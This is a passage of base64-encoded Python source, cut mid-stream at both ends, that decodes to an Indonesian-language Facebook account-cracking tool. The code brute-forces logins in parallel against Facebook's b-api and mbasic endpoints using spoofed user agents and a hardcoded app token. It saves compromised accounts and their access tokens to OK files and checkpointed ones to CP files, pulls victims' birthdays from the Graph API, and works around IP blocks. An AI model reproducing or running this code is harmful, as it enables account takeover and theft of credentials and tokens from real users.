g0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIAljb250aW51ZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgCXc9dy5sb3dlcigpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgCXB3eCA9IENvbWJpbmF0aW4ocHcpDQogICAgICAgICAgICAgICAgICAgICAgICBsb2cuc3VibWl0KHNlbGYuYl9hcGksIHVzZXIsIHB3eCkNCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0OiBwYXNzDQogICAgICAgICAgICBvcy5yZW1vdmUoc2VsZi5hcGspDQogICAgICAgICAgICBleGl0KCIlc+KAoiBmaW5pc2hlZCIlKEgpKQ0KICAgICAgICBlbGlmIHN1dXUgaW4gKCcyJywgJzAyJyk6DQogICAgICAgICAgICBwcmludCAoJ1xuJXMlcyVzIGFrdW4gJXNbT0tdICVzdGVyc2ltcGFuIGtlIGZpbGUgJXM+ICVzT0svJXMudHh0JyUoVSx0aWwsTyxILE8sTSxILHdha3R1KSk7amVkYSgwLjIpDQogICAgICAgICAgICBwcmludCAoJyVzJXMlcyBha3VuICVzWyVzQ1Alc10lcyB0ZXJzaW1wYW4ga2UgZmlsZSAlcz4gJXNDUC8lcy50eHQnJShVLHRpbCxPLE0sSyxNLE8sTSxLLHdha3R1KSk7amVkYSgwLjIpDQogICAgICAgICAgICBqYWxhbiAoJ1xuJXMhJXMgbWFpbmthbiBtb2RlIHBlc2F3YXQgMiBkZXRpayBqaWthIGxhbWEgaGFzaWwgXG4nJShVLE8pKTtqZWRhKDAuMikNCiAgICAgICAgICAgIHdpdGggVGhyZWFkUG9vbEV4ZWN1dG9yKG1heF93b3JrZXJzPTMwKSBhcyBsb2c6DQogICAgICAgICAgICAJZm9yIGFrdW4gaW4gc2VsZi5pZDogDQogICAgICAgICAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICAgICAgICAgIHVzZXIgPSBha3VuLnNwbGl0KCc8PT4nKVswXQ0KICAgICAgICAgICAgICAgICAgICAgICAgcHcgPSBha3VuLnNwbGl0KCc8PT4nKVsxXQ0KICAgICAgICAgICAgICAgICAgICAgICAgZm9yIHcgaW4gcHcuc3BsaXQoIiAiKToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBsZW4odyk8MzoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAJY29udGludWUNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIAl3PXcubG93ZXIoKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIAlwd3ggPSBDb21iaW5hdGluKHB3KQ0KICAgICAgICAgICAgICAgICAgICAgICAgbG9nLnN1Ym1pdChzZWxmLmJhc2ljLCB1c2VyLCBwd3gpDQogICAgICAgICAgICAgICAgICAgIGV4Y2VwdDogcGFzcw0KICAgICAgICAgICAgb3MucmVtb3ZlKHNlbGYuYXBrKQ0KICAgICAgICAgICAgZXhpdCgiJXPigKIgZmluaXNoZWQiJShIKSkNCiAgICAgICAgZWxpZiBzdXV1IGluICgnMycsICcwMycpOg0KICAgICAgICAgICAgcHJpbnQgKCdcbiVzJXMlcyBha3VuICVzW09LXSAlc3RlcnNpbXBhbiBrZSBmaWxlICVzPiAlc09LLyVzLnR4dCclKFUsdGlsLE8sSCxPLE0sSCx3YWt0dSkpO2plZGEoMC4yKQ0KICAgICAgICAgICAgcHJpbnQgKCclcyVzJXMgYWt1biAlc1slc0NQJXNdJXMgdGVyc2ltcGFuIGtlIGZpbGUgJXM+ICVzQ1AvJXMudHh0JyUoVSx0aWwsTyxNLEssTSxPLE0sSyx3YWt0dSkpO2plZGEoMC4yKQ0KICAgICAgICAgICAgamFsYW4gKCdcbiVzISVzIG1haW5rYW4gbW9kZSBwZXNhd2F0IDIgZGV0aWsgamlrYSBsYW1hIGhhc2lsIFxuJyUoVSxPKSk7amVkYSgwLjIpDQogICAgICAgICAgICB3aXRoIFRocmVhZFBvb2xFeGVjdXRvcihtYXhfd29ya2Vycz0zMCkgYXMgbG9nOg0KICAgICAgICAgICAgCWZvciBha3VuIGluIHNlbGYuaWQ6IA0KICAgICAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgICAgICB1c2VyID0gYWt1bi5zcGxpdCgnPD0+JylbMF0NCiAgICAgICAgICAgICAgICAgICAgICAgIHB3ID0gYWt1bi5zcGxpdCgnPD0+JylbMV0NCiAgICAgICAgICAgICAgICAgICAgICAgIGZvciB3IGluIHB3LnNwbGl0KCIgIik6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgbGVuKHcpPDM6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgCWNvbnRpbnVlDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAJdz13Lmxvd2VyKCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAJcHd4ID0gQ29tYmluYXRpbihwdykNCiAgICAgICAgICAgICAgICAgICAgICAgIGxvZy5zdWJtaXQoc2VsZi5tb2JpbCwgdXNlciwgcHd4KQ0KICAgICAgICAgICAgICAgICAgICBleGNlcHQ6IHBhc3MNCiAgICAgICAgICAgIG9zLnJlbW92ZShzZWxmLmFwaykNCiAgICAgICAgICAgIGV4aXQoIiVz4oCiIGZpbmlzaGVkIiUoSCkpDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICBwcmludCgiJXPigKIgSXNpIHlhbmcgYmVuYXIga2VudG9kICIlKE0pKTtzZWxmLmxhbmdzdW5nKCkNCiAgICMgQl9BUEkNCiAgICBkZWYgYl9hcGkoc2VsZiwgdXNlciwgbWFudWFsKToNCiAgICAgICAgZ2xvYmFsIG9rLGNwLGxvb3ANCiAgICAgICAgZm9yIHB3IGluIG1hbnVhbDoNCiAgICAgICAgICAgIHB3ID0gcHcubG93ZXIoKQ0KICAgICAgICAgICAgc2VzID0gcmVxdWVzdHMuU2Vzc2lvbigpDQogICAgICAgICAgICB1YV9waSA9IHJhbmRvbS5jaG9pY2UoWyJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgNC40LjQ7IGVuLWF1OyBTQU1TVU5HIFNNLU45MTVHIEJ1aWxkL0tUVTg0UCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLVEhNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi8yLjAgQ2hyb21lLzM0LjAuMTg0Ny43NiBNb2JpbGUgU2FmYXJpLzUzNy4zNiIsIk5va2lhWDMtMDIvNS4wICgwNi4wNSkgUHJvZmlsZS9NSURQLTIuMSBDb25maWd1cmF0aW9uL0NMREMtMS4xIE1vemlsbGEvNS4wIEFwcGxlV2ViS2l0LzQyMCsgKEtIVE1MLCBsaWtlIEdlY2tvKSBTYWZhcmkvNDIwKyIsIk1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMDsgTWkgOVQgUHJvIEJ1aWxkL1FLUTEuMTkwODI1LjAwMjsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS84OC4wLjQzMjQuMTgxIE1vYmlsZSBTYWZhcmkvNTM3LjM2W0ZCQU4vRU1BO0ZCTEMvaXRfSVQ7RkJBVi8yMzkuMC4wLjEwLjEwOTtdIiwiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDQuMS4yOyBOb2tpYV9YIEJ1aWxkL0paTzU0SykgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzMwLjAuMTU5OS44MiBNb2JpbGUgU2FmYXJpLzUzNy4zNiBOb2tpYUJyb3dzZXIvMS4yLjAuMTIiLCJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgNS4xLjE7IE5hdm9yaSBRTCBTdGl4IDM1MDAgQnVpbGQvTE1ZNDlGOyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzY3LjAuMzM5Ni44NyBTYWZhcmkvNTM3LjM2IiwiTm9raWFDMy0wMC81LjAgKDA3LjIwKSBQcm9maWxlL01JRFAtMi4xIENvbmZpZ3VyYXRpb24vQ0xEQy0xLjEgTW96aWxsYS81LjAgQXBwbGVXZWJLaXQvNDIwKyAoS0hUTUwsIGxpa2UgR2Vja28pIFNhZmFyaS80MjArIiwiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDUuMDsgQVNVU19aMDBBRCBCdWlsZC9MUlgyMVYpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS8zNy4wLjAuMCBNb2JpbGUgU2FmYXJpLzUzNy4zNiIsIltGQkFOL0ZCNEEsRkJBVi8yMjIuMC4wLjQ4LjExMztGQkJWLzE1NTMyMzM2NjtGQkRNL3tkZW5zaXR5PTIuMCx3aWR0aD03MjAsaGVpZ2h0PTEzNjB9O0ZCTEMvc3JfUlM7RkJSVi8xNTY2MjU2OTY7RkJDUi9tdDpzO0ZCTUYvSFVBV0VJO0ZCQkQvSFVBV0VJLC5GQlBOL2NvbS5mYWNlYm9vay5rYXRhbmE7RkJEVi9MRE4tTDIxO0ZCU1YvOC4wLjA7RkJPUC8xOS5GQkNBL2FybWVhYmktdjdhOmFybWVhYmksXSIsIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS85MC4wLjQ0MzAuOTMgU2FmYXJpLzUzNy4zNiJdKQ0KICAgICAgICAgICAgaGVhZGVyID0geyJ1c2VyLWFnZW50IjogdWFfcGksIngtZmItY29ubmVjdGlvbi1iYW5kd2lkdGgiOiBzdHIocmFuZG9tLnJhbmRpbnQoMjAwMDAwMDAuMCwzMDAwMDAwMC4wKSksIngtZmItc2ltLWhuaSI6IHN0cihyYW5kb20ucmFuZGludCgyMDAwMCw0MDAwMCkpLCJ4LWZiLW5ldC1obmkiOiBzdHIocmFuZG9tLnJhbmRpbnQoMjAwMDAsNDAwMDApKSwieC1mYi1jb25uZWN0aW9uLXF1YWxpdHkiOiAiRVhDRUxMRU5UIiwieC1mYi1jb25uZWN0aW9uLXR5cGUiOiAiY2VsbC5DVFJhZGlvQWNjZXNzVGVjaG5vbG9neUhTRFBBIiwiY29udGVudC10eXBlIjogImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCIsIngtZmItaHR0cC1lbmdpbmUiOiAiTGlnZXIifQ0KICAgICAgICAgICAgcmVzcG9uc2UgPSBzZXMuZ2V0KCdodHRwczovL2ItYXBpLmZhY2Vib29rLmNvbS9tZXRob2QvYXV0aC5sb2dpbj9mb3JtYXQ9anNvbiZlbWFpbD0nK3N0cih1c2VyKSsnJnBhc3N3b3JkPScrc3RyKHB3KSsnJmNyZWRlbnRpYWxzX3R5cGU9ZGV2aWNlX2Jhc2VkX2xvZ2luX3Bhc3N3b3JkJmdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xJmVycm9yX2RldGFpbF90eXBlPWJ1dHRvbl93aXRoX2Rpc2FibGVkJnNvdXJjZT1kZXZpY2VfYmFzZWRfbG9naW4mbWV0YV9pbmZfZmJtZXRhPSUyMCZjdXJyZW50bHlfbG9nZ2VkX2luX3VzZXJpZD0wJm1ldGhvZD1HRVQmbG9jYWxlPWVuX1VTJmNsaWVudF9jb3VudHJ5X2NvZGU9VVMmZmJfYXBpX2NhbGxlcl9jbGFzcz1jb20uZmFjZWJvb2suZm9zLmhlYWRlcnN2Mi5mYjRhb3JjYS5IZWFkZXJzVjJDb25maWdGZXRjaFJlcXVlc3RIYW5kbGVyJmFjY2Vzc190b2tlbj0zNTA2ODU1MzE3Mjh8NjJmOGNlOWY3NGIxMmY4NGMxMjNjYzIzNDM3YTRhMzImZmJfYXBpX3JlcV9mcmllbmRseV9uYW1lPWF1dGhlbnRpY2F0ZSZjcGw9dHJ1ZScsIGhlYWRlcnM9aGVhZGVyKS50ZXh0DQogICAgICAgICAgICBpZiAiQW5kYSBUaWRhayBEYXBhdCBNZW5nZ3VuYWthbiBGaXR1ciBJbmkgU2VrYXJhbmciIGluIHJlc3BvbnNlOg0KICAgICAgICAgICAgCWxvb3AgKz0xDQogICAgICAgICAgICAgICAgcHJpbnQgKCJcclwwMzNbMDs5MW3igKIgSVAgdGVyYmxva2lyLiBoaWR1cGthbiBtb2RlIHBlc2F3YXQgMiBkZXRpayIpLA0KICAgICAgICAgICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKQ0KICAgICAgICAgICAgICAgIHNlbGYuYl9hcGkodXNlciwgbWFudWFsKQ0KICAgICAgICAgICAgaWYgJ3Nlc3Npb25fa2V5JyBpbiByZXNwb25zZSBhbmQgJ0VBQUEnIGluIHJlc3BvbnNlOg0KICAgICAgICAgICAgICAgIHByaW50ICdcciAlcyotLT4gJXMg4peKICVzIOKXiiAlcyAnICUgKEgsdXNlcixwdyxyZXNwb25zZS5qc29uKClbJ2FjY2Vzc190b2tlbiddKQ0KICAgICAgICAgICAgICAgIG9rLmFwcGVuZCgnJXMg4peKICVzIOKXiiAlcyclKHVzZXIscHcscmVzcG9uc2UuanNvbigpWydhY2Nlc3NfdG9rZW4nXSkpDQogICAgICAgICAgICAgICAgb3BlbignT0svJXMudHh0JyUod2FrdHUpLCAnYScpLndyaXRlKCcgKi0tPiAlcyDil4ogJXMg4peKICVzXG4nJSh1c2VyLHB3LHJlc3BvbnNlLmpzb24oKVsnYWNjZXNzX3Rva2VuJ10pKQ0KICAgICAgICAgICAgICAgIGJyZWFrDQogICAgICAgICAgICBlbGlmICd3d3cuZmFjZWJvb2suY29tJyBpbiByZXNwb25zZS5qc29uKClbJ2Vycm9yX21zZyddOg0KICAgICAgICAgICAgICAgIGlmICJtdW5jdWwiIGluIHNlbGYub3BzaV9jOg0KICAgICAgICAgICAgICAgIAl0cnk6DQogICAgICAgICAgICAgICAgCSAgICByb216ID0gb3BlbignZGF0YS90b2tlbi50eHQnKS5yZWFkKCkNCiAgICAgICAgICAgICAgICAJICAgIGxhaGlyID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8lcz9hY2Nlc3NfdG9rZW49JXMnJSh1c2VyLHJvbXopKS5qc29uKClbJ2JpcnRoZGF5J10NCiAgICAgICAgICAgICAgICAJICAgIG1vbnRoLCBkYXksIHllYXIgPSBsYWhpci5zcGxpdCgnLycpDQogICAgICAgICAgICAgICAgCSAgICBzZWxmLmNyNGNrKHVzZXIscHcsZGF5LG1vbnRoLHllYXIpDQogICAgICAgICAgICAgICAgCSAgICBjcC5hcHBlbmQoIiVzIOKXiiAlcyDil4ogJXMgJXMgJXMiJSh1c2VyLHB3LGRheSxtb250aCx5ZWFyKSkNCiAgICAgICAgICAgICAgICAJICAgIG9wZW4oJ0NQLyVzLnR4dCcgJSh3YWt0dSksICdhJykud3JpdGUoIiAqLS0+ICVzIOKXiiAlcyDil4ogJXMgJXMgJXNcbiIlICh1c2VyLHB3LGRheSxtb250aCx5ZWFyKSkNCiAgICAgICAgICAgICAgICAJICAgIGJyZWFrDQogICAgICAgICAgICAgICAgCWV4Y2VwdCBLZXlFcnJvcjoNCiAgICAgICAgICAgICAgICAJICAgIGRheSA9ICcnDQogICAgICAgICAgICAgICAgCSAgICBtb250aCA9ICcnDQogICAgICAgICAgICAgICAgCSAgICB5ZWFyICA9ICcnDQogICAgICAgICAgICAgICAgCWV4Y2VwdDogcGFzcw0KICAgICAgICAgICAgICAgIAlzZWxmLmNyM2NrKHVzZXIscHcpDQogICAgICAgICAgICAgICAgCWNwLmFwcGVuZCgnJXMg4peKICVzJyUodXNlcixwdykpDQogICAgICAgICAgICAgICAgCW9wZW4oJ0NQLyVzLnR4dCcgJSh3YWt0dSksICdhJykud3JpdGUoIiAqLS0+ICVzIOKXiiAlc1xuIiAlICh1c2VyLHB3KSkNCiAgICAgICAgICAgICAgICAJYnJlYWsNCiAgICAgICAgICAgICAgICBlbGlmICJna19tdW5jdWwiIGluIHNlbGYub3BzaV9jOg0KICAgICAgICAgICAgICAgIAl0cnk6DQogICAgICAgICAgICAgICAgCSAgICByb216ID0gb3BlbignZGF0YS90b2tlbi50eHQnKS5yZWFkKCkNCiAgICAgICAgICAgICAgICAJICAgIGxhaGlyID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8lcz9hY2Nlc3NfdG9rZW49JXMnJSh1c2VyLHJvbXopKS5qc29uKClbJ2JpcnRoZGF5J10NCiAgICAgICAgICAgICAgICAJICAgIG1vbnRoLCBkYXksIHllYXIgPSBsYWhpci5zcGxpdCgnLycpDQogICAgICAgICAgICAgICAgCSAgICBwcmludCAnXHIgJXMqLS0+ICVzIOKXiiAlcyDil4ogJXMgJXMgJXMgICcgJSAoSyx1c2VyLHB3LGRheSxtb250aCx5ZWFyKQ0KICAgICAgICAgICAgICAgIAkgICAgY3AuYXBwZW5kKCIlcyDil4ogJXMg4peKICVzICVzICVzIiUodXNlcixwdyxkYXksbW9udGgseWVhcikpDQogICAgICAgICAgICAgICAgCSAgICBvcGVuKCdDUC8lcy50eHQnICUod2FrdHUpLCAnYScpLndyaXRlKCIgKi0tPiAlcyDil4ogJXMg4peKICVzICVzICVzXG4iJSAodXNlcixwdyxkYXksbW9udGgseWVhcikpDQogICAgICAgICAgICAgICAgCSAgICBicmVhaw0KICAgICAgICAgICAgICAgIAlleGNlcHQgS2V5RXJyb3I6DQogICAgICAgICAgICAgICAgCSAgICBkYXkgPSAnJw0KICAgICAgICAgICAgICAgIAkgICAgbW9udGggPSAnJw0KICAgICAgICAgICAgICAgIAkgICAgeWVhciAgPSAnJw0KICAgICAgICAgICAgICAgIAlleGNlcHQ6IHBhc3MNCiAgICAgICAgICAgICAgICAJcHJpbnQgJ1xyICVzKi0tPiAlcyDil4ogJXMgICAgICAgICAgICcgJSAoSyx1c2VyLHB3KQ0KICAgICAgICAgICAgICAgIAljcC5hcHBlbmQoJyVzIOKXiiAlcyclKHVzZXIscHcpKQ0KICAgICAgICAgICAgICAgIAlvcGVuKCdDUC8lcy50eHQnICUod2FrdHUpLCAnYScpLndyaXRlKCIgKi0tPiAlcyDil4ogJXNcbiIgJSAodXNlcixwdykpDQogICAgICAgICAgICAgICAgCWJyZWFrDQogICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgCWNvbnRpbnVlDQogICAgICAgIGxvb3AgKz0gMQ0KICAgICAgICB3YXJuYSA9IHJhbmRvbS5jaG9pY2UoW00sIEgsIEssIEIsIFUsIE8sIFBdKQ0KICAgICAgICBwcmludCgnXHInK3dhcm5hKyfigKJceDFiWzE7OTZtIFtjcmFja10gJXMvJXMgW09LOiVzXS1bQ1A6JXNdJyUobG9vcCxsZW4oc2VsZi5pZCksbGVuKG9rKSxsZW4oY3ApKSksDQogICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKQ0KICAgIyBNQkFTSUMNCiAgICBkZWYgYmFzaWMoc2VsZiwgdXNlciwgbWFudWFsLCoqZGF0YSk6DQogICAgCWdsb2JhbCBvayxjcCxsb29wDQogICAgCWlmICJyYW5kb20iIGluIHNlbGYudWdlbjoNCiAgICAJICAgIHRyeToNCiAgICAJICAgICAgICB1YSA9IHJhbmRvbS5jaG9pY2UoWyJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgNC40LjQ7IGVuLWF1OyBTQU1TVU5HIFNNLU45MTVHIEJ1aWxkL0tUVTg0UCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLVEhNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi8yLjAgQ2hyb21lLzM0LjAuMTg0Ny43NiBNb2JpbGUgU2FmYXJpLzUzNy4zNiIsIk5va2lhWDMtMDIvNS4wICgwNi4wNSkgUHJvZmlsZS9NSURQLTIuMSBDb25maWd1cmF0aW9uL0NMREMtMS4xIE1vemlsbGEvNS4wIEFwcGxlV2ViS2l0LzQyMCsgKEtIVE1MLCBsaWtlIEdlY2tvKSBTYWZhcmkvNDIwKyIsIk1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMDsgTWkgOVQgUHJvIEJ1aWxkL1FLUTEuMTkwODI1LjAwMjsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS84OC4wLjQzMjQuMTgxIE1vYmlsZSBTYWZhcmkvNTM3LjM2W0ZCQU4vRU1BO0ZCTEMvaXRfSVQ7RkJBVi8yMzkuMC4wLjEwLjEwOTtdIiwiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDQuMS4yOyBOb2tpYV9YIEJ1aWxkL0paTzU0SykgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzMwLjAuMTU5OS44MiBNb2JpbGUgU2FmYXJpLzUzNy4zNiBOb2tpYUJyb3dzZXIvMS4yLjAuMTIiLCJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgNS4xLjE7IE5hdm9yaSBRTCBTdGl4IDM1MDAgQnVpbGQvTE1ZNDlGOyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzY3LjAuMzM5Ni44NyBTYWZhcmkvNTM3LjM2IiwiTm9raWFDMy0wMC81LjAgKDA3LjIwKSBQcm9maWxlL01JRFAtMi4xIENvbmZpZ3VyYXRpb24vQ0xEQy0xLjEgTW96aWxsYS81LjAgQXBwbGVXZWJLaXQvNDIwKyAoS0hUTUwsIGxpa2UgR2Vja28pIFNhZmFyaS80MjArIiwiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDUuMDsgQVNVU19aMDBBRCBCdWlsZC9MUlgyMVYpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS8zNy4wLjAuMCBNb2JpbGUgU2FmYXJpLzUzNy4zNiIsIltGQkFOL0ZCNEEsRkJBVi8yMjIuMC4wLjQ4LjExMztGQkJWLzE1NTMyMzM2NjtGQkRNL3tkZW5zaXR5PTIuMCx3aWR0aD03MjAsaGVpZ2h0PTEzNjB9O0ZCTEMvc3JfUlM7RkJSVi8xNTY2MjU2OTY7RkJDUi9tdDpzO0ZCTUYvSFVBV0VJO0ZCQkQvSFVBV0VJLC5GQlBOL2NvbS5mYWNlYm9vay5rYXRhbmE7RkJEVi9MRE4tTDIxO0ZCU1YvOC4wLjA7RkJPUC8xOS5GQkNBL2FybWVhYmktdjdhOmFybWVhYmksXSIsIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS85MC4wLjQ0MzAuOTMgU2FmYXJpLzUzNy4zNiJdKQ0KICAgICAgICAgICAgZXhjZXB0IElPRXJyb3I6DQogICAgICAgICAgICAJdWEgPSAnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBNaSA5VCBQcm8gQnVpbGQvUUtRMS4xOTA4MjUuMDAyOyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzg4LjAuNDMyNC4xODEgTW9iaWxlIFNhZmFyaS81MzcuMzZbRkJBTi9FTUE7RkJMQy9pdF9JVDtGQkFWLzIzOS4wLjAuMTAuMTA5O10nDQogICAgICAgIGVsaWYgImdrX3JhbmRvbSIgaW4gc2VsZi51Z2VuOg0KICAgICAgICAJdHJ5Og0KICAgICAgICAJICAgIHVhID0gb3BlbigndWEudHh0JywgJ3InKS5yZWFkKCkNCiAgICAgICAgCWV4Y2VwdCBJT0Vycm9yOg0KICAgICAgICAJICAgIHVhID0gJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMDsgTWkgOVQgUHJvIEJ1aWxkL1FLUTEuMTkwODI1LjAwMjsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS84OC4wLjQzMjQuMTgxIE1vYmlsZSBTYWZhcmkvNTM3LjM2W0ZCQU4vRU1BO0ZCTEMvaXRfSVQ7RkJBVi8yMzkuMC4wLjEwLjEwOTtdJw0KICAgICAgICBmb3IgcHcgaW4gbWFudWFsOiAgDQogICAgICAgICAgICBzZXMgPSByZXF1ZXN0cy5TZXNzaW9uKCkNCiAgICAgICAgICAgIHNlcy5oZWFkZXJzLnVwZGF0ZSh7Ikhvc3QiOiJtYmFzaWMuZmFjZWJvb2suY29tIiwidXBncmFkZS1pbnNlY3VyZS1yZXF1ZXN0cyI6IjEiLCJ1c2VyLWFnZW50Ijp1YSwiYWNjZXB0IjoidGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3NpZ25lZC1leGNoYW5nZTt2PWIzO3E9MC45IiwiZG50IjoiMSIsIngtcmVxdWVzdGVkLXdpdGgiOiJtYXJrLnZpYS5ncCIsInNlYy1mZXRjaC1zaXRlIjoibm9uZSIsInNlYy1mZXRjaC1tb2RlIjoibmF2aWdhdGUiLCJzZWMtZmV0Y2gtdXNlciI6Ij8xIiwic2VjLWZldGNoLWRlc3QiOiJkb2N1bWVudCIsInJlZmVyZXIiOiJodHRwczovL2RldmVsb3BlcnMuZmFjZWJvb2suY29tLyIsImFjY2VwdC1lbmNvZGluZyI6Imd6aXAsIGRlZmxhdGUiLCJhY2NlcHQtbGFuZ3VhZ2UiOiJpZC1JRCxpZDtxPTAuOSxlbi1VUztxPTAuOCxlbjtxPTAuNyJ9KQ0KICAgICAgICAgICAgcCA9IHNlcy5nZXQoJ2h0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS9pbmRleC5waHA/bmV4dD1odHRwcyUzQSUyRiUyRmRldmVsb3BlcnMuZmFjZWJvb2suY29tJTJGdG9vbHMlMkZkZWJ1ZyUyRmFjY2Vzc3Rva2VuJTJGJykudGV4dA0KICAgICAgICAgICAgZGF0YWEgPXsibHNkIjpyZS5zZWFyY2goJ25hbWU9ImxzZCIgdmFsdWU9IiguKj8pIicsIHN0cihwKSkuZ3JvdXAoMSksImphem9lc3QiOnJlLnNlYXJjaCgnbmFtZT0iamF6b2VzdCIgdmFsdWU9IiguKj8pIicsIHN0cihwKSkuZ3JvdXAoMSksInVpZCI6dXNlciwiZmxvdyI6ImxvZ2luX25vX3BpbiIsInBhc3MiOnB3LCJuZXh0IjoiaHR0cHM6Ly9kZXZlbG9wZXJzLmZhY2Vib29rLmNvbS90b29scy9kZWJ1Zy9hY2Nlc3N0b2tlbi8ifQ0KICAgICAgICAgICAgc2VzLmhlYWRlcnMudXBkYXRlKHsiSG9zdCI6Im1iYXNpYy5mYWNlYm9vay5jb20iLCJjYWNoZS1jb250cm9sIjoibWF4LWFnZT0wIiwidXBncmFkZS1pbnNlY3VyZS1yZXF1ZXN0cyI6IjEiLCJvcmlnaW4iOiJodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20iLCJjb250ZW50LXR5cGUiOiJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQiLCJ1c2VyLWFnZW50Ijp1YSwiYWNjZXB0IjoidGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3NpZ25lZC1leGNoYW5nZTt2PWIzO3E9MC45IiwieC1yZXF1ZXN0ZWQtd2l0aCI6Im1hcmsudmlhLmdwIiwic2VjLWZldGNoLXNpdGUiOiJzYW1lLW9yaWdpbiIsInNlYy1mZXRjaC1tb2RlIjoibmF2aWdhdGUiLCJzZWMtZmV0Y2gtdXNlciI6Ij8xIiwic2VjLWZldGNoLWRlc3QiOiJkb2N1bWVudCIsInJlZmVyZXIiOiJodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20vaW5kZXgucGhwP25leHQ9aHR0cHMlM0ElMkYlMkZkZXZlbG9wZXJzLmZhY2Vib29rLmNvbSUyRnRvb2xzJTJGZGVidWclMkZhY2Nlc3N0b2tlbiUyRiIsImFjY2VwdC1lbmNvZGluZyI6Imd6aXAsIGRlZmxhdGUiLCJhY2NlcHQtbGFuZ3VhZ2UiOiJpZC1JRCxpZDtxPTAuOSxlbi1VUztxPTAuOCxlbjtxPTAuNyJ9KQ0KICAgICAgICAgICAgcG8gPSBzZXMucG9zdCgnaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC92YWxpZGF0ZS1wYXNzd29yZC8/c2hibD0wJyxkYXRhPWRhdGFhLGFsbG93X3JlZGlyZWN0cz1GYWxzZSk7amVkYSgyKQ0KI